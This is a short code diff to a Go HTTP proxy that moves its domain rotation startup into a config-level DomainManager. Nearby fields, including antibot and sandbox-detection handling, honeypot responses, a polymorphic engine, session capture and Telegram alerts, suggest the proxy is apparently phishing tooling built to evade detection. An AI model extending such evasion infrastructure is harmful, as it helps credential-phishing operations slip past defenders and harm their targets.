@@ -81,7 +81,6 @@ type HttpProxy struct {
 	antibotEngine     *antibot.AntibotEngine
 	captchaManager    *response.CaptchaManager
 	spoofManager      *response.SpoofManager
-	domainRotation    *infra.DomainRotationManager
 	polymorphicEngine *infra.PolymorphicEngine
 	sessionFormatter  *SessionFormatter
 	sniListener       net.Listener
@@ -135,7 +134,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		antibotEngine:     nil, // Will be initialized
 		captchaManager:    response.NewCaptchaManager(cfg.GetCaptchaConfig()),
 		spoofManager:      response.NewSpoofManager(cfg.GetAntibotConfig().SpoofUrl, cfg.GetSandboxDetectionConfig().HoneypotResponse),
-		domainRotation:    nil, // Will be initialized based on config
 		polymorphicEngine: nil, // Will be initialized based on config
 		sessionFormatter:  NewSessionFormatter(),
 		isRunning:         false,
@@ -216,11 +214,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.antibotEngine = antibot.NewAntibotEngine(ipSignal, rateSignal, tlsSignal, telemetrySignal)
 
-	// Initialize domain rotation if enabled
-	if cfg.GetDomainRotationConfig() != nil && cfg.GetDomainRotationConfig().Enabled {
-		p.domainRotation = infra.NewDomainRotationManager(cfg.GetDomainRotationConfig())
-		log.Info("Domain rotation system initialized")
-	}
 
 	// Initialize polymorphic engine if enabled
 	if cfg.GetPolymorphicConfig() != nil && cfg.GetPolymorphicConfig().Enabled {
@@ -2251,10 +2244,9 @@ func (p *HttpProxy) Start() error {
 		p.telegram.SetConfig(telegramConfig.BotToken, telegramConfig.ChatID, telegramConfig.Enabled)
 	}
 
-	// Start domain rotation if enabled
-	if p.domainRotation != nil && p.cfg.GetDomainRotationConfig().Enabled {
-		err := p.domainRotation.Start()
-		if err != nil {
+	// Start domain rotation via DomainManager
+	if dm := p.cfg.GetDomainManager(); dm != nil {
+		if err := dm.Start(); err != nil {
 			log.Error("Failed to start domain rotation: %v", err)
 		}
 	}
